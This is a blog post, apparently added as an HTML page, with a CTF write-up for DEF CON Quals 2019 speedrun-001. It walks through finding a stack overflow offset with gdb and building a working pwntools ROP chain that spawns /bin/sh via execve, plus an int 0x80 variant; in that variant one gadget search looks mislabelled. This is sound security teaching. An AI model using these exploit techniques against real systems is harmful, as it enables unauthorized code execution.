@@ -1,0 +1,224 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Defcon Quals 2019 -- speedrun-001 Writeup, Environment Setup, pwntools Tutorial</title>
+    <link rel="stylesheet" href="assets/css/styles.css">
+    <link rel="stylesheet" href="assets/css/atom-one-dark.min.css">
+    <script src="assets/js/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+  </head>
+  <body>
+    <header>
+    <div class="container">
+        <div class="som"><a href="/">Strip of Mist</a></div>
+        <h2>Trying stuff out</h2>
+    </div>
+    </header>
+
+    <div class="content-container">
+    <h1>Defcon Quals 2019 -- speedrun-001 Writeup, Environment Setup, pwntools Tutorial</h1>
+<p>I am leaving behind this breadcrumb trail to getting an environment configured and using pwntools for a basic pwning CTF problem.</p>
+<h2 id="Environment Setup">Environment Setup</h2>
+<p>First install VirtualBox and Vagrant. I <a href="https://www.vagrantup.com/docs/boxes/base.html">created a custom Vagrant box</a>, but using one of the publicly made boxes like generic/debian10 will work fine.</p>
+<p>SSH into the Vagrant box and use the following commands. This should get you some approximation of a working CTF setup.</p>
+<pre><code>sudo apt-get update &amp;&amp; sudo apt-get -y dist-upgrade
+sudo apt-file update
+source /usr/share/virtualenvwrapper/virtualenvwrapper.sh
+mkvirtualenv normal
+pip install pwntools</code></pre>
+<p>Any dotfiles (.vimrc, .bashrc, .emacs, .tmux.conf, etc.) should be copied over at this stage as well. The folder that contains the Vagrantfile on the host doubles as a shared folder in the VM under the path /vagrant/. Using scp also works.</p>
+<h2 id="speedrun-001">speedrun-001</h2>
+<p><a href="https://s3.us-east-2.amazonaws.com/oooverflow-challs/c3174710ab5f90f46fdf555ae346b6a40fc647ef6aa51d05c2b19379d4c06048/speedrun-001">speedrun-001</a></p>
+<p>speedrun-001 is a relatively straightforward ROP problem that is vulnerable to a blind overflow. I chose to start with this one because it allows us to exercise some tool functionality without getting too into the weeds on understanding the binary itself. This writeup requires understanding the <a href="https://hovav.net/ucsd/dist/geometry.pdf">basics of ROP</a>.</p>
+<h2 id="Strategy">Strategy</h2>
+<p>The vulnerability is a simple overflow; we can cause the binary to return to (and thus, execute the code at) any location we write onto the stack. The binary is statically linked, so there are tons of gadgets. Our basic plan is to initiate an execve system call with "/bin/sh" as its argument. We'll find that there is not currently any "/bin/sh" string in the binary, so we need to write it ourselves before we ultimately execute the syscall.</p>
+<h2 id="Initial Poking Around">Initial Poking Around</h2>
+<p>We'll first pull some basic information out of the binary.</p>
+<p><div class="img-container"><img src="images/file-checksec.png" alt="" /></div></p>
+<p>We learn quite a bit here.</p>
+<ul>
+<li>ELF 64-bit</li>
+<li>Statically linked</li>
+<li>Binary has been stripped. We won't have information about where functions start and end if we try to reverse engineer the binary</li>
+<li>There are no canaries to worry about. We can overflow buffers without a care</li>
+<li>NX is on. Certain sections will be writeable, others will be executable, but there won't be sections where we can do both</li>
+</ul>
+<p>Let's try running it.</p>
+<p><div class="img-container"><img src="images/run-it.png" alt="" /></div></p>
+<p>Type something and hit enter:</p>
+<p><div class="img-container"><img src="images/run-it-bananas.png" alt="" /></div></p>
+<p>Alas, we had no luck today. Right about now is a good time to use some hacker intuition. Something we should always try is submitting a huge amount of data.</p>
+<p>One can easily generate an arbitrarily large string of As to pipe into the stdin of an executable with <code>python -c "print 'A'*&lt;int&gt;"</code>.</p>
+<p><div class="img-container"><img src="images/A-segfault.png" alt="" /></div></p>
+<p>Segfault. The program tried to access memory in a way it's not allowed. We'll probably want to load this into gdb to get more information, but one quick thing we can do is check dmesg. Every segfault generates a line in /var/log/kern.log that tells you what the instruction pointer and stack pointer were right before the segfault.</p>
+<p><div class="img-container"><img src="images/dmesg.png" alt="" /></div></p>
+<p>These look like legitimate values for rip and rsp. Remember the stack exists in high address memory space and the .text code section is at low ones.</p>
+<p><div class="img-container"><img src="images/memory.png" alt="" /></div></p>
+<p>We can objdump the binary to get a quick idea of the instruction at 0x400bad with <code>objdump -D speedrun-001 | less</code>.</p>
+<p><div class="img-container"><img src="images/objdump.png" alt="" /></div></p>
+<p>Remember this binary is stripped, so we don't have any function information, but we can still tell that the instruction that caused the segfault was a retq.</p>
+<h2 id="Finding the Offset with gdb and pwn cyclic">Finding the Offset with gdb and pwn cyclic</h2>
+<p>Let's try the same thing, but run the program under gdb. That way we can poke around at the memory space and registers at the moment of the segfault.</p>
+<p>An easy way to generate stdin for speedrun-001 while it's running under gdb is to create a file with the input and redirect it to the program when you use the r command in gdb.</p>
+<pre><code>python -c &quot;print &#39;A&#39;*2000&quot; &gt; inp  # Put all the As into the file inp.
+gdb speedrun-001
+r &lt; inp</code></pre>
+<p>Now the program is in the register and memory state of the segfault. Actually it's just before the segfaulting instruction. The program tried to execute the instruction but got a segfault so it couldn't complete it successfully. We can poke around here a little to figure out what is going on.</p>
+<p><div class="img-container"><img src="images/gdb-post-mortem.png" alt="" /></div></p>
+<p><code>x/10xg $rsp</code></p>
+<ul>
+<li><code>x</code> -- eXamine memory</li>
+<li><code>/</code> -- separator character</li>
+<li><code>10</code> -- give us 10 results</li>
+<li><code>x</code> -- formatted as heX</li>
+<li><code>g</code> -- of size Giant (64 bits)</li>
+<li><code>$rsp</code> -- starting at the address contained in the rsp register</li>
+</ul>
+<p>We see a ton of As on the stack from our input. 0x41 is the hex ASCII value for 'A'.</p>
+<p><code>x/1i</code> $rip</p>
+<ul>
+<li><code>x/1</code> -- eXamine memory and give us 1 result (similar to the last command)</li>
+<li><code>i</code> -- formatted as an Instruction</li>
+<li>We don't need a size here. Instructions in x86 are variable sizes and the <code>i</code> formatting will figure out the size for us.</li>
+</ul>
+<p>Here we see what we learned from <code>objdump</code> and <code>dmesg</code>. The instruction that caused the segfault is a <code>retq</code> at address <code>0x400bad</code>.</p>
+<p>What happens in a <code>retq</code>? The value pointed to by <code>rsp</code> is put into <code>rip</code> and <code>rsp</code> becomes <code>rsp</code> + 8. It's unlikely there is a problem with adding 8 to <code>rsp</code>. We can see that memory location from our <code>x/10xg $rsp</code> instruction. It's already been written to when we filled it with As and there wasn't a segfault then. It's much more likely that when we tried to put 0x41414141 into <code>rip</code> and read from that that it was an unmapped memory location.</p>
+<p>Great! So instead of sending all As and making that specific value on the stack 0x41414141, we'll put in the address of our ROP gadgets and get the program to execute commands that we control. But which 4 As are the one that caused the crash when <code>rip</code> tried to read from them? We sent 2000 of them. If we poke around a little more we can see that both before and after <code>rsp</code> there are many As.</p>
+<p><div class="img-container"><img src="images/gdb-post-mortem2.png" alt="" /></div></p>
+<p>Really the exact As we want are the ones pointed to by <code>rsp</code> because they are the ones that will be fed into <code>rip</code>.</p>
+<p>The easy way to do this is to use pwn cyclic. It will generate a prefix-free string of different characters. We'll send that to gdb and see which values appear in <code>rsp</code> and then ask pwn cyclic how many characters it sent before the ones we want. Note that if you're using a virtualenv you need to activate it before using pwn cyclic.</p>
+<p><div class="img-container"><img src="images/pwn-cyclic.png" alt="" /></div></p>
+<p>Run <code>gdb</code> again, this time using the file produced by pwn cyclic. Find the value pointed to by <code>rsp</code>. We want to know how many bytes come before the value in <code>rsp</code>. pwn cyclic requires a 4 byte input, so we take the 4 least significant (x86 is little endian) bytes of the values pointed to by <code>rsp</code>.</p>
+<p><div class="img-container"><img src="images/pwn-cyclic-rsp.png" alt="" /></div></p>
+<p>0x6b616169. That's the value that will cause the crash. Now we find the offset by again calling pwn cyclic. This time with -l.</p>
+<p><div class="img-container"><img src="images/pwn-cyclic-offset.png" alt="" /></div></p>
+<p>1032 is the offset we will use to start writing our exploit.</p>
+<h2 id="Using pwntools">Using pwntools</h2>
+<p>pwntools is a python library used in exploitation. The general idea is to start a target process with pwntools and communicate back and forth with it. Instead of navigating through program prompts or setting breakpoints and entering different inputs under <code>gdb</code>, you can just run the pwntools script and it'll start the process and communicate with it as deterministically as it's able. Also, pwntools has a lot of helpful tools to help build payloads.</p>
+<p>A simple template follows:</p>
+<pre><code>from pwn import *
+
+progname = &quot;./speedrun-001&quot;
+context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)
+
+bin = ELF(progname)
+pop_rax = bin.search(asm(&quot;pop rax; ret;&quot;)).next()
+
+p = process(progname)
+#p = remote(&quot;speedrun-001.quals2019.oooverflow.io&quot;, 31337)
+
+print p.recvuntil(&quot;Any last words?\n&quot;)
+
+payload = &quot;A&quot;*1032
+payload += &quot;sploits&quot;
+payload += &quot;sploits&quot;
+payload += &quot;sploits&quot;
+
+p.sendline(payload)
+p.interactive()</code></pre>
+<p>In a little more depth:</p>
+<pre><code>from pwn import *
+
+progname = &quot;./speedrun-001&quot;
+context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)</code></pre>
+<p>Mostly boilerplate stuff.</p>
+<pre><code>bin = ELF(progname)
+pop_rax = bin.search(asm(&quot;pop rax; ret;&quot;)).next()</code></pre>
+<p>In this section we parse the binary and then use it to search for gadgets. The `asm("pop rax; ret;") compiles that assembly code and outputs the machine code as a string. That machine code is used as an input for bin.search(), which finds an address of that gadget if it exists. If not the program will raise a StopIteration exception so you'll know it doesn't exist. This search doesn't just work with well-aligned instructions, it'll try every weird alignment and find gadgets if they exist.</p>
+<pre><code>p = process(progname)
+#p = remote(&quot;speedrun-001.quals2019.oooverflow.io 31337&quot;)
+
+print p.recvuntil(&quot;Any last words?\n&quot;)</code></pre>
+<p>The first two lines are two separate ways of running the process. The first is running it locally on your machine. Once you've successfully got an exploit, you replace the first line with the second one and use it against the actual game server and port. The third line just outputs all the stdout that the process produces and gets to a place where it's ready for input.</p>
+<pre><code>payload = &quot;A&quot;*1032
+payload += &quot;sploits&quot;
+
+p.sendline(payload)
+p.interactive()</code></pre>
+<p>Here we build and send a payload. After we send the payload and get a shell, p.interactive() will let us interact with the shell.</p>
+<h2 id="Payload Research">Payload Research</h2>
+<p>There are just a few more values we need before we can craft a payload. Again, our goal is to execute an <code>execve</code> syscall with "/bin/sh" as an argument. We can write whatever we want on the stack and we have a ton of potential gadgets in the binary itself.</p>
+<p><code>execve</code> syscall information can be found in <a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">this table</a>.</p>
+<ul>
+<li><code>rax</code> must hold the value 59. We'll need a way to get a value into <code>rax</code>. One easy way is a pop gadget.</li>
+<li><code>/bin/sh</code> doesn't require any arguments or environment variables, so <code>rsi</code> and <code>rdx</code> should be 0. We'll look for pop gadgets for each of them.</li>
+<li><code>rdi</code> has to hold a pointer to "/bin/sh". It's unlikely the string "/bin/sh" appears in the binary, so we'll have to put it into the memory space at a known address. We could put it on the stack, but the stack location changes every time we run the program because of <a href="https://www.utdallas.edu/~zhiqiang.lin/file/aslr.pdf">ASLR</a>, so we won't know the address of it.
+<ul>
+<li>We need a writeable memory location.</li>
+<li>We need a memory write gadget.</li>
+</ul></li>
+<li>We need a syscall instruction</li>
+</ul>
+<p>So first, <code>strings speedrun-001 | grep "/bin/sh"</code> predictably returns nothing.</p>
+<p>To find rop gadgets, we'll use the tool ROPgadget which comes with pwntools. <code>ROPgadget --binary speedrun-001 &gt; gadgets</code> will create a file called gadgets with all the gadgets. Now we can grep.</p>
+<p><div class="img-container"><img src="images/gadget-grep.png" alt="" /></div></p>
+<p>This proves that they exist. Rather than writing down these addresses, we'll just let the pwntools <code>bin.search()</code> find them when we run the python script.</p>
+<p>We still need a memory write gadget and a writeable location. To find the location we can background the program with <code>./speedrun-001  &amp;</code> in one window to get the process id and check the <code>/proc/&lt;pid&gt;/maps</code> in another.</p>
+<p><div class="img-container"><img src="images/writeable-location.png" alt="" /></div></p>
+<p>The first memory segment is the .text section. It's executable, but not writeable. The second segment is the .data segment and is writeable. We'll just use the first location, 0x6b6000.</p>
+<p>Finally, we need a gadget that will write to memory. Preferably the write would only use the registers we can already populate. This is a situation where using the gadgets file is helpful, because we're not exactly sure what instruction we want. We can grep through our gadgets file for something like ': mov qword.*ret'.</p>
+<p><div class="img-container"><img src="images/mov-qword-ret.png" alt="" /></div></p>
+<p>We got kind of lucky. Near the top we find <code>0x000000000048d251 : mov qword ptr [rax], rdx ; ret</code>. We already can pop things into <code>rax</code> and <code>rdx</code>, so we'll use this gadget. If this list had been polluted with longer and less useful gadgets we could use something like the following one liner to find good candidates. It sorts by length to find simpler gadgets.</p>
+<p><div class="img-container"><img src="images/oneliner-gadget-search.png" alt="" /></div></p>
+<h2 id="Crafting the Payload">Crafting the Payload</h2>
+<p>All the hard work is done. We'll put all our gadgets at the top of the file so we can use them in the payload.</p>
+<pre><code>pop_rdi = bin.search(asm(&quot;pop rdi; ret;&quot;)).next()
+pop_rsi = bin.search(asm(&quot;pop rsi; ret;&quot;)).next()
+pop_rax = bin.search(asm(&quot;pop rax; ret;&quot;)).next()
+pop_rdx = bin.search(asm(&quot;pop rdx; ret;&quot;)).next()
+write_gadg = bin.search(asm(&quot;mov [rax], rdx; ret;&quot;)).next()
+syscall = bin.search(asm(&quot;syscall;&quot;)).next()</code></pre>
+<p>Then we write "/bin/sh" to .data.</p>
+<pre><code># Write &quot;/bin/sh&quot; to .data section
+# Pop &quot;/bin/sh&quot; into rdx
+payload += p64(pop_rdx)  # gadget
+payload += p64(int(&quot;/bin/sh&quot;[::-1].encode(&quot;hex&quot;), 16))  # Value to be popped into rdx
+
+# Pop .data address into rax
+payload += p64(pop_rax)  # gadget
+payload += p64(0x6b6000)  # Value to be popped (address of .data)
+
+# Perform the write to memory
+payload += p64(write_gadg)  # mov [rax], rdx</code></pre>
+<p>Then we set up and call the syscall.</p>
+<pre><code># Set up and call execve syscall
+# Pop 59 into rax
+payload += p64(pop_rax)  # gadget
+payload += p64(59)  # Value to be popped (execve syscall number)
+
+# Pop &quot;/bin/sh&quot; pointer to rdi
+payload += p64(pop_rdi)  # gadget
+payload += p64(0x6b6000)  # Value to be popped (address of &quot;/bin/sh&quot;)
+
+# Pop 0 into rsi
+payload += p64(pop_rsi)  # gadget
+payload += p64(0x0)  # Value to be popped
+
+# Pop 0 into rdx
+payload += p64(pop_rdx)  # gadget
+payload += p64(0x0)  # Value to be popped
+
+# Perform the actual syscall
+payload += p64(syscall)</code></pre>
+<p>And that's all there is to it.</p>
+<p><div class="img-container"><img src="images/success.png" alt="" /></div></p>
+<h2 id="Bonus: int 0x80">Bonus: int 0x80</h2>
+<p>Instead of syscall, you can use the int 0x80 command to execute an execve syscall.</p>
+<p>You can find an old <a href="https://web.archive.org/web/20080223212133/http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html">int 0x80 syscall table</a> for the necessary register values. The "/bin/sh" write to .data is the same, but now you set up and invoke the system call differently.</p>
+<p>Here's a taste</p>
+<pre><code>pop_rbx = bin.search(asm(&quot;pop rbx; ret;&quot;)).next()
+pop_rcx = bin.search(asm(&quot;pop rdx; ret;&quot;)).next()
+int80 = bin.search(asm(&quot;int 0x80;&quot;)).next()
+
+payload += p64(pop_rax)
+payload += p64(11)
+payload += p64(pop_rbx)
+payload += p64(0x6b6000)
+payload += p64(pop_rdx)
+payload += p64(0x0)
+payload += p64(pop_rcx)
+payload += p64(0x0)
+payload += p64(int80)</code></pre>
+</div></body></html>
